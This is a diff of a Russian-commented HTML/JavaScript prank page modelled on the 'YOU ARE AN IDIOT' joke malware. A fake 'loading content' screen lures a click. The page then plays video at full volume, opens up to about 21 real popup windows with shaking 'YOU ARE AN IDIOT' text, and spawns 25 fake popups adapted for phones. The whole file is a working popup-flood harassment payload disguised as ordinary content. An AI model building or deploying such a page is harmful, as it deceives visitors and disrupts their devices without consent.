@@ -10,60 +10,38 @@
             background: #000; overflow: hidden;
             font-family: Arial, sans-serif;
         }
-
-        /* ===== Стартовый экран ===== */
         #start-screen {
             position: fixed; top: 0; left: 0;
             width: 100%; height: 100%;
             display: flex; flex-direction: column;
             align-items: center; justify-content: center;
-            background: radial-gradient(circle at center, #111 0%, #000 100%);
-            z-index: 99999;
-            transition: opacity 0.6s;
+            background: #000; cursor: pointer; z-index: 9999;
         }
-        #start-screen.fade-out { opacity: 0; pointer-events: none; }
         #start-screen h1 {
-            font-size: 28px; color: #fff;
-            margin: 0 0 12px; letter-spacing: 2px;
-        }
-        #start-screen p {
-            font-size: 15px; color: #888;
-            margin: 0 0 40px; text-align: center;
-            max-width: 420px; line-height: 1.5;
+            font-size: 22px; color: #fff; margin-bottom: 30px;
         }
         #green-btn {
             background: #00cc44; color: #fff; border: none;
-            padding: 22px 60px; font-size: 22px;
-            border-radius: 10px; cursor: pointer;
-            font-weight: bold; letter-spacing: 1px;
-            box-shadow: 0 0 30px rgba(0, 204, 68, 0.7);
-            transition: transform 0.15s, box-shadow 0.3s;
-            animation: pulse 1.6s infinite;
+            padding: 18px 40px; font-size: 20px;
+            border-radius: 8px; cursor: pointer;
+            box-shadow: 0 0 20px rgba(0, 204, 68, 0.6);
         }
-        #green-btn:hover { background: #00ff55; transform: scale(1.06); }
-        #green-btn:active { transform: scale(0.96); }
-        @keyframes pulse {
-            0%, 100% { box-shadow: 0 0 30px rgba(0, 204, 68, 0.7); }
-            50% { box-shadow: 0 0 55px rgba(0, 255, 85, 1); }
-        }
-
-        /* ===== Контейнер YouTube ===== */
+        #green-btn:hover { background: #00ff55; }
         #video-container {
             position: fixed; top: 0; left: 0;
             width: 100%; height: 100%;
             z-index: 1; display: none; background: #000;
-            overflow: hidden;
         }
-        #yt-player {
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
+        #fullscreen-video {
+            width: 100%; height: 100%; object-fit: cover;
         }
+        .hidden { display: none !important; }
 
-        /* ===== ФЕЙКОВЫЕ ОКНА ===== */
+        /* ===== ФЕЙКОВЫЕ ОКНА (работают на телефоне) ===== */
         .fake-popup {
             position: fixed;
-            width: 420px;
+            width: 320px;
+            max-width: 90vw;
             background: #000;
             border: 3px solid red;
             color: red;
@@ -95,14 +73,14 @@
             padding: 0 8px;
             font-size: 14px;
         }
-        .fake-popup .popup-body { padding: 25px 10px; }
+        .fake-popup .popup-body { padding: 20px 10px; }
         .fake-popup h1 {
-            font-size: 38px;
+            font-size: 28px;
             margin: 0;
             animation: blink 0.4s infinite;
             line-height: 1.1;
         }
-        .fake-popup p { margin: 12px 0 0; font-size: 14px; }
+        .fake-popup p { margin: 10px 0 0; font-size: 12px; }
         @keyframes blink {
             0% { color: red; }
             50% { color: black; }
@@ -118,185 +96,60 @@
     </style>
 </head>
 <body>
-
-    <div id="start-screen">
-        <h1>⚙ SYSTEM READY</h1>
-        <p>Один клик — и всё разрешено:<br>видео, звук, всплывающие окна и полный экран</p>
-        <button id="green-btn" onclick="startEverything()">▶ Начать</button>
+    <div id="start-screen" onclick="startVideo()">
+        <h1>Загрузка контента...</h1>
+        <button id="green-btn" onclick="event.stopPropagation(); startVideo();">
+            ▶ Нажми, чтобы показать
+        </button>
     </div>
 
     <div id="video-container">
-        <div id="yt-player"></div>
+        <video id="fullscreen-video" loop playsinline>
+            <source src="video.mp4" type="video/mp4">
+        </video>
     </div>
 
     <script>
-        // ============================================================
-        //  YouTube IFrame API
-        // ============================================================
-        var tag = document.createElement('script');
-        tag.src = "https://www.youtube.com/iframe_api";
-        document.head.appendChild(tag);
-
-        var VIDEO_ID = 'hPZxDJYmTUw';
-        var ytPlayer = null;
-        var ytReady = false;
-
         var started = false;
-        var openedWindows = [];
-        var MAX_WINDOWS = 15;
-        var fakePopupsCount = 0;
-        var MAX_FAKE = 25;
+        var spamInterval = null;
+        var spamCount = 0;
+        var MAX_SPAM = 20;      // сколько РЕАЛЬНЫХ окон пытаться открыть
+        var fakeCount = 0;
+        var MAX_FAKE = 25;      // сколько ФЕЙКОВЫХ окон создать
 
-        function onYouTubeIframeAPIReady() {
-            ytPlayer = new YT.Player('yt-player', {
-                height: '100%',
-                width: '100%',
-                videoId: VIDEO_ID,
-                playerVars: {
-                    autoplay: 0,
-                    controls: 0,
-                    loop: 1,
-                    playlist: VIDEO_ID,
-                    modestbranding: 1,
-                    rel: 0,
-                    fs: 0,
-                    iv_load_policy: 3
-                },
-                events: {
-                    'onReady': function(event) {
-                        ytReady = true;
-                        console.log('YouTube плеер готов');
-                        fitYouTubeToScreen();
-                        if (started) {
-                            event.target.setVolume(100);
-                            event.target.unMute();
-                            event.target.playVideo();
-                        }
-                    },
-                    'onStateChange': function(event) {
-                        if (event.data === YT.PlayerState.ENDED) {
-                            ytPlayer.seekTo(0);
-                            ytPlayer.playVideo();
-                        }
-                    }
-                }
-            });
-        }
-
-        function fitYouTubeToScreen() {
-            var container = document.getElementById('video-container');
-            var w = container.clientWidth;
-            var h = container.clientHeight;
-            var videoAspect = 16 / 9;
-            var screenAspect = w / h;
-            var iframe = document.getElementById('yt-player');
-            if (!iframe) return;
-
-            if (screenAspect > videoAspect) {
-                iframe.style.width = w + 'px';
-                iframe.style.height = (w / videoAspect) + 'px';
-            } else {
-                iframe.style.height = h + 'px';
-                iframe.style.width = (h * videoAspect) + 'px';
-            }
-        }
-        window.addEventListener('resize', fitYouTubeToScreen);
-
-        // ============================================================
-        //  СТАРТ — ОДИН КЛИК
-        // ============================================================
-        function startEverything() {
+        function startVideo() {
             if (started) return;
             started = true;
 
-            // 1. ВИДЕО + ЗВУК
+            document.getElementById('start-screen').classList.add('hidden');
             document.getElementById('video-container').style.display = 'block';
-            fitYouTubeToScreen();
 
-            if (ytReady && ytPlayer) {
-                ytPlayer.setVolume(100);
-                ytPlayer.unMute();
-                ytPlayer.playVideo();
-            } else {
-                console.log('Ждём готовности плеера...');
-            }
+            var video = document.getElementById('fullscreen-video');
+            video.muted = false;
+            video.volume = 1.0;
+            video.play().catch(function(e) {
+                console.log('Ошибка автоплея:', e);
+            });
 
-            // 2. FULLSCREEN
-            try {
-                var el = document.documentElement;
-                if (el.requestFullscreen) el.requestFullscreen().catch(function(){});
-                else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-            } catch(e) {}
-
-            // 3. ОТКРЫВАЕМ РЕАЛЬНЫЕ ОКНА
-            for (var i = 0; i < MAX_WINDOWS; i++) {
-                try {
-                    var w = window.open('', '_blank', 'width=500,height=400');
-                    if (w && !w.closed) {
-                        w.document.write(`
-                            <html><head><title>Loading...</title></head>
-                            <body style="background:#000;color:#0f0;font-family:monospace;
-                                         display:flex;align-items:center;justify-content:center;
-                                         height:100vh;margin:0;">
-                                <h2>Загрузка... #${i+1}</h2>
-                            </body></html>
-                        `);
-                        openedWindows.push(w);
-                    }
-                } catch(e) { break; }
-            }
-
-            console.log('Реальных окон открыто:', openedWindows.length);
-
-            // 4. Скрываем стартовый экран
-            var ss = document.getElementById('start-screen');
-            ss.classList.add('fade-out');
-            setTimeout(function() { ss.style.display = 'none'; }, 600);
-
-            // 5. ЧЕРЕЗ 1 СЕКУНДУ — ХАОС
+            // ===== ЧЕРЕЗ 1 СЕКУНДУ — ХАОС =====
             setTimeout(startChaos, 1000);
         }
 
-        // ============================================================
-        //  ХАОС
-        // ============================================================
         function startChaos() {
-            // A) Реальные окна → вирус
-            var realTimer = setInterval(function() {
-                if (openedWindows.length === 0) {
-                    clearInterval(realTimer);
-                    return;
-                }
-                var w = openedWindows.shift();
-                if (w && !w.closed) fillVirusWindow(w, fakePopupsCount);
-            }, 400);
-
-            // B) Фейковые окна
-            var spawnFake = setInterval(function() {
-                if (fakePopupsCount >= MAX_FAKE) {
-                    clearInterval(spawnFake);
-                    return;
-                }
-                fakePopupsCount++;
-                createFakePopup(fakePopupsCount);
-            }, 350);
-        }
-
-        function fillVirusWindow(w, index) {
-            if (!w || w.closed) return;
-            try {
-                w.document.open();
+            // ---------- 1. РЕАЛЬНЫЕ ОКНА (работают на ПК) ----------
+            var w = window.open('', '_blank', 'width=600,height=500');
+            if (w) {
                 w.document.write(`
                     <html>
                     <head><title>YOU ARE AN IDIOT</title></head>
                     <body style="background:black;color:red;font-family:monospace;
-                                 text-align:center;padding-top:60px;overflow:hidden;margin:0;">
-                        <h1 style="font-size:70px;animation:blink 0.4s infinite;margin:0;">
+                                 text-align:center;padding-top:50px;overflow:hidden;">
+                        <h1 style="font-size:60px;animation:blink 0.4s infinite;">
                             YOU ARE AN IDIOT
                         </h1>
-                        <h2 style="font-size:32px;margin-top:20px;">SURVIVAL FOR THE FITTEST</h2>
+                        <h2 style="font-size:30px;">SURVIVAL FOR THE FITTEST</h2>
                         <button onclick="window.close()" style="font-size:20px;
-                                padding:15px 30px;margin-top:40px;
+                                padding:15px 30px;margin-top:30px;
                                 background:red;color:white;border:none;
                                 cursor:pointer;">CLOSE ME</button>
                         <style>
@@ -308,25 +161,83 @@
                             body { animation: shake 0.1s infinite; }
                             @keyframes shake {
                                 0% { transform: translate(0,0); }
-                                25% { transform: translate(3px,3px); }
-                                50% { transform: translate(-3px,-3px); }
-                                75% { transform: translate(3px,-3px); }
+                                25% { transform: translate(2px,2px); }
+                                50% { transform: translate(-2px,-2px); }
+                                75% { transform: translate(2px,-2px); }
                                 100% { transform: translate(0,0); }
                             }
                         </style>
                     </body>
                     </html>
                 `);
-                w.document.close();
-            } catch(e) {}
+            }
+
+            // Дополнительные реальные окна
+            spamInterval = setInterval(function() {
+                if (spamCount >= MAX_SPAM) {
+                    clearInterval(spamInterval);
+                    return;
+                }
+                spamCount++;
+                try {
+                    var w2 = window.open('', '_blank', 'width=400,height=350');
+                    if (w2) {
+                        w2.document.write(`
+                            <html>
+                            <head><title>YOU ARE AN IDIOT</title></head>
+                            <body style="background:black;color:red;
+                                         font-family:monospace;text-align:center;
+                                         padding-top:40px;">
+                                <h1 style="font-size:40px;
+                                           animation:blink 0.3s infinite;">
+                                    YOU ARE AN IDIOT
+                                </h1>
+                                <p style="font-size:18px;">#` + spamCount + `</p>
+                                <button onclick="window.close()"
+                                        style="font-size:16px;padding:10px 20px;
+                                        background:red;color:white;border:none;
+                                        cursor:pointer;margin-top:20px;">
+                                    CLOSE ME
+                                </button>
+                                <style>
+                                    @keyframes blink {
+                                        0% { color: red; }
+                                        50% { color: black; }
+                                        100% { color: red; }
+                                    }
+                                </style>
+                            </body>
+                            </html>
+                        `);
+                    }
+                } catch(e) {}
+            }, 400);
+
+            // ---------- 2. ФЕЙКОВЫЕ ОКНА (работают ВЕЗДЕ, включая телефон) ----------
+            var fakeInterval = setInterval(function() {
+                if (fakeCount >= MAX_FAKE) {
+                    clearInterval(fakeInterval);
+                    return;
+                }
+                fakeCount++;
+                createFakePopup(fakeCount);
+            }, 350);
         }
 
+        function stopSpam() {
+            if (spamInterval) {
+                clearInterval(spamInterval);
+                spamInterval = null;
+            }
+        }
+
+        // ===== ФЕЙКОВОЕ ОКНО В DOM =====
         function createFakePopup(index) {
             var popup = document.createElement('div');
             popup.className = 'fake-popup';
 
-            var maxX = Math.max(0, window.innerWidth - 440);
-            var maxY = Math.max(0, window.innerHeight - 260);
+            var maxX = Math.max(0, window.innerWidth - 340);
+            var maxY = Math.max(0, window.innerHeight - 220);
             popup.style.left = Math.floor(Math.random() * maxX) + 'px';
             popup.style.top = Math.floor(Math.random() * maxY) + 'px';
 
@@ -342,34 +253,53 @@
             `;
             document.body.appendChild(popup);
 
+            // Закрытие
             popup.querySelector('.popup-close').addEventListener('click', function(e) {
                 e.stopPropagation();
                 popup.remove();
             });
 
+            // Перетаскивание (мышь + тач)
             var titleBar = popup.querySelector('.popup-title');
             var dragging = false, offsetX = 0, offsetY = 0;
 
-            titleBar.addEventListener('mousedown', function(e) {
+            function startDrag(x, y) {
                 dragging = true;
-                offsetX = e.clientX - popup.offsetLeft;
-                offsetY = e.clientY - popup.offsetTop;
+                offsetX = x - popup.offsetLeft;
+                offsetY = y - popup.offsetTop;
                 popup.style.animation = 'none';
-                e.preventDefault();
-            });
-
-            document.addEventListener('mousemove', function(e) {
+            }
+            function moveDrag(x, y) {
                 if (!dragging) return;
-                popup.style.left = (e.clientX - offsetX) + 'px';
-                popup.style.top = (e.clientY - offsetY) + 'px';
-            });
-
-            document.addEventListener('mouseup', function() {
+                popup.style.left = (x - offsetX) + 'px';
+                popup.style.top = (y - offsetY) + 'px';
+            }
+            function endDrag() {
                 if (dragging) {
                     dragging = false;
                     popup.style.animation = 'shake 0.15s infinite';
                 }
+            }
+
+            titleBar.addEventListener('mousedown', function(e) {
+                startDrag(e.clientX, e.clientY);
+                e.preventDefault();
             });
+            document.addEventListener('mousemove', function(e) {
+                moveDrag(e.clientX, e.clientY);
+            });
+            document.addEventListener('mouseup', endDrag);
+
+            titleBar.addEventListener('touchstart', function(e) {
+                var t = e.touches[0];
+                startDrag(t.clientX, t.clientY);
+                e.preventDefault();
+            }, {passive: false});
+            document.addEventListener('touchmove', function(e) {
+                var t = e.touches[0];
+                moveDrag(t.clientX, t.clientY);
+            }, {passive: false});
+            document.addEventListener('touchend', endDrag);
         }
     </script>
 </body>
